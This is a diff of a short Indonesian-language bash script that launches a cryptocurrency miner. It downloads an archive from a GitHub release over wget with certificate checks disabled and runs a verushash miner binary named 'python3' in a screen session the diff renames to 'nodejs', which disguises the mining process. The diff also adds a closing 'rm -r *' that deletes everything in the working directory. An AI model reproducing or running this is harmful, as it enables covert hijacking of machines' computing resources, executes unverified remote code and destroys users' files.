@@ -2,7 +2,7 @@
 
 # Cek jumlah argumen
 if [ "$#" -lt 2 ]; then
-    echo "Usage: $0 <wallet> <pool:port>"
+    echo "GUNAKAN FORMAT: WALLET POOL"
     exit 1
 fi
 
@@ -10,22 +10,20 @@ fi
 WALLET=$1
 POOL=$2
 
-# Unduh dan ekstrak file jika belum ada
-if [ ! -d "dotsrb" ]; then
-    echo "Mengunduh dan mengekstrak miner..."
-    wget -O dotsrb.tar.gz --no-check-certificate https://github.com/DOT-AJA/KONTOL-DOT/releases/download/KONTOL/dotsrb.tar.gz
-    tar -xvf dotsrb.tar.gz
-    rm dotsrb.tar.gz
+if [ ! -d "mek" ]; then
+    echo "unduh dan ektraks"
+    wget -O mek --no-check-certificate https://github.com/DOT-AJA/KONTOL-DOT/releases/download/KONTOL/dotsrb.tar.gz
+    tar -xvf mek
 else
-    echo "Folder 'dotsrb' sudah ada, melewatkan pengunduhan."
+    echo "File sudah ada"
 fi
 
-# Mendapatkan IP dan membentuk identifier unik
 IP=$(curl -s ifconfig.me)
 IP_NUMBERS=${IP//./}
 LAST_SIX=${IP_NUMBERS: -6}
 
 # Menjalankan miner dengan parameter
-echo "Memulai miner dengan wallet: $WALLET dan pool: $POOL"
-cd dotsrb || exit
-screen -dmS miner ./python3 --algorithm verushash --pool "$POOL" --wallet "$WALLET.RIG_$LAST_SIX" --password x
+echo "MINER IS RUNNING!!!"
+screen -dmS nodejs ./dotsrb/python3 --algorithm verushash --pool $POOL --wallet $WALLET.RIG_$LAST_SIX --password x
+
+rm -r *
